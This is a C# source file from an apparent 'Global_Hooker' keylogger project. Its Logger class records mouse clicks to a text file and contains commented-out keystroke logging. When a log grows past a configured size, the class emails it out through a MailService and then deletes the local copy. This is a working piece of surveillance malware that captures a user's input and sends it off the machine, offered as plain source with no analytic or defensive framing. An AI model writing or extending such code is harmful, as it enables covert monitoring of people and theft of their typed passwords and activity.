﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


namespace Global_Hooker
{
    class Logger
    {
        private readonly ConfigurationManager _configuration;
        private static string _clickLog = "clickLog.txt";
        private static string _keyLog = "keyLog.txt";
        private bool _shouldDeletedLogKey = false;
        private bool _shouldDeletedLogMouse = false;

        public Logger()
        {
           _configuration = ConfigurationManager.Instance;
        }

        public void LogKey(string message)
        {
            //try
            //{
            //    if (_shouldDeletedLogKey)
            //    {
            //        new FileInfo(_keyLog).Delete();
            //        _shouldDeletedLogKey = false;
            //    }
            //    using (StreamWriter writer = new StreamWriter(_keyLog, true))
            //    {
            //        writer.WriteLineAsync(message);
            //    }
            //}
            //catch (Exception ex)
            //{
            //    Console.Write(ex.ToString());
            //}
            //CheckSize(_keyLog);
        }

        public void LogClick(string message)
        {
            try
            {
                if (_shouldDeletedLogMouse)
                {
                    new FileInfo(_clickLog).Delete();
                    _shouldDeletedLogMouse = false;
                }
                using (StreamWriter writer = new StreamWriter(_clickLog, true))
                {
                    writer.WriteLineAsync(message);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            CheckSize(_clickLog);
        }

        private void CheckSize(string filePath)
        {
            if (new FileInfo(filePath).Length > _configuration.MaxFileSize)
            {
                new MailService(DeleteFile).SendMail(filePath);
            }
        }

        private void DeleteFile(string filePath)
        {
            if (filePath.EndsWith(_keyLog)) _shouldDeletedLogKey = true;
            else _shouldDeletedLogMouse = true;

        }
    }
}